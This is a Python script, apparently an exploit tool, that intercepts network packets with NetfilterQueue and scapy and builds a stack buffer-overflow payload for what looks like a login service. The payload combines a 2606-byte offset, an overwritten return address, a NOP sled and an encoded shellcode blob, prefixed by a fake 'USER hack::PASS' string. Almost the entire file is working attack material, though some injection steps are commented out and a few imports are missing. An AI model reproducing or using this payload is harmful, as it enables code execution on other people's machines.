#!/usr/bin/env python2.7
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from netfilterqueue import NetfilterQueue
import socket
import os
import sys
from pprint import pprint

try:
    QUEUE_NUM = int(os.getenv('QUEUE_NUM', 1))
except ValueError as e:
    sys.stderr.write('Error: env QUEUE_NUM must be integer\n')
    sys.exit(1)

def callback(pkt):
    try:
        p = IP(pkt.get_payload())

        ip = p.getlayer(IP)
        tcp = p.getlayer(TCP)
        raw = p.getlayer(Raw)

        if tcp.flags == 17:
            pkt.drop()
        else:
	    offset = "A" * 2606
            eip = "\x8f\x35\x4a\x5f"
            noop = "\x90" * 8
            shellcode = ("\xda\xc3\xd9\x74\x24\xf4\xbe\x30\x8f\x4f\xb0\x5f\x29\xc9\xb1"
            "\x52\x31\x77\x17\x83\xef\xfc\x03\x47\x9c\xad\x45\x5b\x4a\xb3"
            "\xa6\xa3\x8b\xd4\x2f\x46\xba\xd4\x54\x03\xed\xe4\x1f\x41\x02"
            "\x8e\x72\x71\x91\xe2\x5a\x76\x12\x48\xbd\xb9\xa3\xe1\xfd\xd8"
            "\x27\xf8\xd1\x3a\x19\x33\x24\x3b\x5e\x2e\xc5\x69\x37\x24\x78"
            "\x9d\x3c\x70\x41\x16\x0e\x94\xc1\xcb\xc7\x97\xe0\x5a\x53\xce"
            "\x22\x5d\xb0\x7a\x6b\x45\xd5\x47\x25\xfe\x2d\x33\xb4\xd6\x7f"
            "\xbc\x1b\x17\xb0\x4f\x65\x50\x77\xb0\x10\xa8\x8b\x4d\x23\x6f"
            "\xf1\x89\xa6\x6b\x51\x59\x10\x57\x63\x8e\xc7\x1c\x6f\x7b\x83"
            "\x7a\x6c\x7a\x40\xf1\x88\xf7\x67\xd5\x18\x43\x4c\xf1\x41\x17"
            "\xed\xa0\x2f\xf6\x12\xb2\x8f\xa7\xb6\xb9\x22\xb3\xca\xe0\x2a"
            "\x70\xe7\x1a\xab\x1e\x70\x69\x99\x81\x2a\xe5\x91\x4a\xf5\xf2"
            "\xd6\x60\x41\x6c\x29\x8b\xb2\xa5\xee\xdf\xe2\xdd\xc7\x5f\x69"
            "\x1d\xe7\xb5\x3e\x4d\x47\x66\xff\x3d\x27\xd6\x97\x57\xa8\x09"
            "\x87\x58\x62\x22\x22\xa3\xe5\x8d\x1b\x08\xf4\x65\x5e\x4e\xd7"
            "\x8e\xd7\xa8\x7d\x61\xbe\x63\xea\x18\x9b\xff\x8b\xe5\x31\x7a"
            "\x8b\x6e\xb6\x7b\x42\x87\xb3\x6f\x33\x67\x8e\xcd\x92\x78\x24"
            "\x79\x78\xea\xa3\x79\xf7\x17\x7c\x2e\x50\xe9\x75\xba\x4c\x50"
            "\x2c\xd8\x8c\x04\x17\x58\x4b\xf5\x96\x61\x1e\x41\xbd\x71\xe6"
            "\x4a\xf9\x25\xb6\x1c\x57\x93\x70\xf7\x19\x4d\x2b\xa4\xf3\x19"
            "\xaa\x86\xc3\x5f\xb3\xc2\xb5\xbf\x02\xbb\x83\xc0\xab\x2b\x04"
            "\xb9\xd1\xcb\xeb\x10\x52\xeb\x09\xb0\xaf\x84\x97\x51\x12\xc9"
            "\x27\x8c\x51\xf4\xab\x24\x2a\x03\xb3\x4d\x2f\x4f\x73\xbe\x5d"
            "\xc0\x16\xc0\xf2\xe1\x32")

            buffer = offset + eip + noop + shellcode

            payload_len_before = len(p[TCP].payload)
            injection = b'USER hack::PASS ' + buffer
            payload = '\x82~\x0b\xaa' + injection
            payload_len_after = len(payload)
            payload_len_diff = payload_len_after - payload_len_before
            payload_len = p[IP].len + payload_len_diff

            if p[IP].len >= 1000:
                ip_layer  = IP(version=p[IP].version, ihl=p[IP].ihl, tos=p[IP].tos, len=payload_len, \
                               id=p[IP].id, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, \
                               proto=p[IP].proto, src=p[IP].src, \
                               dst=p[IP].dst, options=p[IP].options)
                tcp_layer = TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack, \
                                dataofs=tcp.dataofs, reserved=tcp.reserved, \
                                flags=tcp.flags, window=tcp.window, \
                                urgptr=tcp.urgptr, \
                                options=tcp.options)

                packet = ip_layer/tcp_layer/(payload)
            #    print "Original: "
            #    pprint(p)
            #    print "Crafted: "
                pprint(p)
	    #    frags = fragment(packet, fragsize=1000)
	    #    for fragments in frags:
	    #    	fragments.show()
	    #    	send(fragment)
            #    pkt.set_payload(str(p))
                pkt.accept()
            else:
                pkt.accept()

    except Exception as e:
        print 'Error: %s' % str(e)

        pkt.drop()

def kill_process(process):
    p = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    out, err = p.communicate()

    for line in out.splitlines():
        if process in line:
            pid = int(line.split(None, 1)[0])
            os.kill(pid, signal.SIGKILL)

def start_process(process_cmd):
    args = shlex.split(process_cmd)
    subprocess.call(args)

sys.stdout.write('Listening on NFQUEUE queue-num %s... \n' % str(QUEUE_NUM))

nfqueue = NetfilterQueue()
nfqueue.bind(QUEUE_NUM, callback)
s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
try:
    nfqueue.run_socket(s)
    #nfqueue.run()
except KeyboardInterrupt:
    sys.stdout.write('Exiting \n')

s.close()
nfqueue.unbind()

